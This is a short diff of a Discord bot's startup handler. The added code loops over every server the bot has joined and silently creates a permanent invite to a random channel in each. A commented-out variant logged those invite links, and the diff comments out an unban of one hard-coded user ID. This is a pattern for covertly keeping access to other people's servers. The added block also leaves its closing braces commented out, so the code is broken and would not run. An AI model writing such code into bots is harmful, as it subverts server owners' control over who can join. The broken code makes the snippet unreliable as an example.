@@ -23,15 +23,21 @@ bot.on('ready', () => {
    //console.log(`ID: ${bot.guild.id}`);
    //console.log(`How many member: ${guild.memberCount}`);
    
+   bot.guilds.forEach(guild => { 
+     var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
+     invite.createInvite({maxAge: 0}).then(invite => console.log(`Connecté sur : ${guild.name} ${guild.id}`));
+       // )
+  // })
+   
   // bot.guilds.forEach(guild => { 
     // var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
     // invite.createInvite({maxAge: 0}).then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
        // )
   // })
   
-  bot.guild.unban('301913733536415755')
-  .then(user => console.log(`Unbanned ${user.username} from ${guild}`))
-  .catch(console.error);
+ // bot.guilds('guild', 'ID').unban('301913733536415755')
+ // .then(user => console.log(`Unbanned ${user.username} from ${guild}`))
+//  .catch(console.error);
    
  });
 
